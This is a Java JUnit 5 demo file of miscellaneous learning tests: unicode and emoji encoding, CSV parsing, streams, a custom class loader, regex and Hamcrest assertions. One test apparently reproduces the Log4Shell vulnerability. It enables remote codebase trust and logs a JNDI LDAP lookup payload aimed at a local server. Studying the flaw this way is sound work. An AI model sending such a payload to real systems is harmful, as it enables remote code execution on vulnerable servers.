package com.yiban.javaBase;

import com.google.common.collect.Maps;
import com.yiban.javaBase.dev.classloader.MyClassLoader;
import com.yiban.javaBase.test.SubThreadLocal;
import lombok.extern.log4j.Log4j2;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.hamcrest.MatcherAssert;
import org.hamcrest.Matchers;
import org.hamcrest.core.AllOf;
import org.hamcrest.core.AnyOf;
import org.junit.Assert;
import org.junit.jupiter.api.*;



import java.io.*;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import static org.hamcrest.core.Is.is;

/**
 * @auther WEI.DUAN
 * @date 2021/6/5
 * @website http://blog.csdn.net/dwshmilyss
 */
public class Junit5Demo {

    private final String patternStr = "^(#\\{)(.+)(\\})$";
    private final Pattern pattern = Pattern.compile(patternStr);

    private static ThreadLocal<Boolean> flag = new ThreadLocal<Boolean>(){
        protected Boolean initialValue() {
            return false;
        }
    };


    @BeforeEach
    public void before() {
        System.out.println("before");
    }


    @org.junit.jupiter.api.Test
    public void testTheadlocal() {
        System.out.println("flag.get() = " + flag.get());
    }
    /**
     * 中文转unicode
     *
     * @param string
     * @return
     */
    public static String unicodeEncode(String string) {
        char[] utfBytes = string.toCharArray();
        String unicodeBytes = "";
        for (int i = 0; i < utfBytes.length; i++) {
            String hexB = Integer.toHexString(utfBytes[i]);
            if (hexB.length() <= 2) {
                hexB = "00" + hexB;
            }
            unicodeBytes = unicodeBytes + "\\u" + hexB;
        }
        return unicodeBytes;
    }

    /**
     * unicode转中文
     */
    public static String unicodeDecode(String string) {
        Pattern pattern = Pattern.compile("(\\\\u(\\p{XDigit}{4}))");
        Matcher matcher = pattern.matcher(string);
        char ch;
        while (matcher.find()) {
            ch = (char) Integer.parseInt(matcher.group(2), 16);
            string = string.replace(matcher.group(1), ch + "");
        }
        return string;
    }

    @org.junit.jupiter.api.Test
    public void test() {
        String csv = "/Users/edz/Desktop/test.csv";
        BufferedReader br = null;
        String line = "";
        String csvSplitBy = ",(?=([^\"]*\"[^\"]*\")*[^\"]*$)";
        try {
            br = new BufferedReader(new FileReader(csv));
            while ((line = br.readLine()) != null) {
                //use comma as separatpr
                String[] major = line.split(csvSplitBy);
                System.out.println(major.length);
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 解析emoji
     *
     * @param num
     * @return
     */
    public static byte[] int2bytes(int num) {
        byte[] result = new byte[4];
        result[0] = (byte) ((num >>> 24) & 0xff);//说明一
        result[1] = (byte) ((num >>> 16) & 0xff);
        result[2] = (byte) ((num >>> 8) & 0xff);
        result[3] = (byte) ((num >>> 0) & 0xff);
        return result;
    }

    private static String getBytesCode(byte[] bytes) {
        String code = "";
        for (byte b : bytes) {
            code += "\\x" + Integer.toHexString(b & 0xff);
        }
        return code;
    }

    @org.junit.jupiter.api.Test
    public void testEmoji() throws UnsupportedEncodingException {
//        String res = URLEncoder.encode("倩倩有个\uD83D\uDC23阿柚吖\uD83C\uDF4A");
        String str = "倩倩有个\uD83D\uDC23阿柚吖\uD83C\uDF4A";
        String res = unicodeEncode(str);
        String unicode = "\uD83C\uDF4A";

        String res1 = unicodeDecode(unicode);
        System.out.println("res = " + res);
        System.out.println("res1 = " + res1);

        //编码转emoji
//        String emojiName = "1f601";  //其实4个字节
        String emojiName = "24C2";
        int emojiCode = Integer.valueOf(emojiName, 16);
        byte[] emojiBytes = int2bytes(emojiCode);
        String emojiChar = new String(emojiBytes, "utf-32");
        System.out.println(emojiChar);
        //emoji转编码
        byte[] bytes = "\uD83C\uDF4A".getBytes("utf-32");
        System.out.println(getBytesCode(bytes));
    }

    @org.junit.jupiter.api.Test
    public void testStream() {
//        Stream.of("one", "two", "three","four").peek(u -> u.toUpperCase())
//                .forEach(System.out::println);
        List list = Stream.of("one", "two", "three", "four").map(u -> u.toUpperCase()).collect(Collectors.toList());
        list.stream().forEach(System.out::println);
    }

    @org.junit.jupiter.api.Test
    public void testClassLoader() throws ClassNotFoundException, InstantiationException, IllegalAccessException {
        MyClassLoader myClassLoader = new MyClassLoader("/Users/edz/.m2/repository/com/facebook/presto/presto-jdbc/0.253.1/presto-jdbc-0.253.1.jar!/com/facebook/presto/jdbc/PrestoDriver.class");
        Class clazz = myClassLoader.loadClass("com.facebook.presto.jdbc.PrestoDriver");
        Object obj = clazz.newInstance();
        System.out.println(obj);
        System.out.println(obj.getClass().getClassLoader());
    }

    private static final Logger logger = LogManager.getLogger(Log4j2.class);
    @org.junit.jupiter.api.Test
    public void testLog4j2Venerability() {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error("params:{}", "${jndi:ldap://127.0.0.1:1389/Log4jTest}");
//        logger.error("params:{}", "${java:version}");
    }

    @org.junit.jupiter.api.Test
    public void testPattern() {
        String res = getUiField("#{contact.tag_ffffff1111}");
        System.out.println("res = " + res);
    }

    @org.junit.jupiter.api.Test
    public void testBit() {
        System.out.println(Integer.toBinaryString(2));
        System.out.println(Integer.toBinaryString(0));
        System.out.println(2 & 0);
    }

    @org.junit.jupiter.api.Test
    public void testMatcherAssert() {
//        MatcherAssert.assertThat(2, Matchers.is(2));// 是否相等
//        MatcherAssert.assertThat(2, Matchers.lessThan(2));// 小于
//        MatcherAssert.assertThat(2, Matchers.lessThanOrEqualTo(2));// 小于等于
//        Map<String,String> map = new HashMap<>();
//        map.put("name","jay");
//        // map 中是否包含key为name的元素
//        MatcherAssert.assertThat(map,Matchers.hasKey("name"));
//        // map 中是否包含value为jay的元素
//        MatcherAssert.assertThat(map,Matchers.hasValue("jay"));
//        // map 中是否包含name等于jay的元素
//        MatcherAssert.assertThat(map,Matchers.hasEntry("name","jay"));
//        // 2 小于4同时也小于3
//        MatcherAssert.assertThat(2, AllOf.allOf(Matchers.lessThan(4), Matchers.lessThan(3)));
        // 2 大于1 或者 小于3 任意满足一个即可
//        MatcherAssert.assertThat(4, AnyOf.anyOf(Matchers.greaterThan(1), Matchers.lessThan(3)));
//        MatcherAssert.assertThat(null,Matchers.nullValue());
        MatcherAssert.assertThat(Maps.newHashMap(),Matchers.notNullValue());
    }

    @org.junit.jupiter.api.Test
    public void testAssert() {
        Assert.assertNotNull(new Object());
    }

    public String getUiField(String field) {
        Matcher matcher = pattern.matcher(field);
        String tmpName = "";
        if (matcher.find()) {
            tmpName = matcher.group(2);
        }
        return tmpName;
    }

    @AfterEach
    public void after() {
        System.out.println("after");
    }

    @BeforeAll
    public static void beforeAll() {
        System.out.println("beforeAll");
    }

    @AfterAll
    public static void afterAll() {
        System.out.println("afterAll");
    }
}